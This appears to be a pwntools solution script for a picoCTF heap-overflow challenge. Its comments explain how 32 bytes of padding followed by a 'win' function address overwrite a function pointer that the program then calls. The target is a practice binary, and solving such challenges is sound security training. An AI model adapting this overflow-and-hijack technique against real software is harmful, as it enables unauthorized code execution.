#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("mimas.picoctf.net", 50843)
    else:
        return process(elf.path)

io = start()

io.sendlineafter(b"Enter your choice: ", b"2")

# Since the check_win type casts the variable "x" to a function pointer and tries to call it, we can use
# the overflow bug to overwrite the value og "x" with the address of the "win" function at 0x4011a0.
# The chunk we have access to is a 0x20 size chunk which in this challenge means 24 bytes of user data
# and 8 bytes of malloc metadata (prev size field of the chunk we control).
# In order to overflow the variable "x", we need to write 24 bytes to fill our user data and additional
# 8 bytes to overwrite the prev size field of the target chunk. Then we need to write the address of "win"
# where the value of "x" is stored.

# 32 to bytes of padding and then the address of win
io.sendlineafter(b"Data for buffer: ", b"A"*32 + p64(0x4011a0))

# call check_win()
io.sendlineafter(b"Enter your choice: ", b"4")
io.interactive()
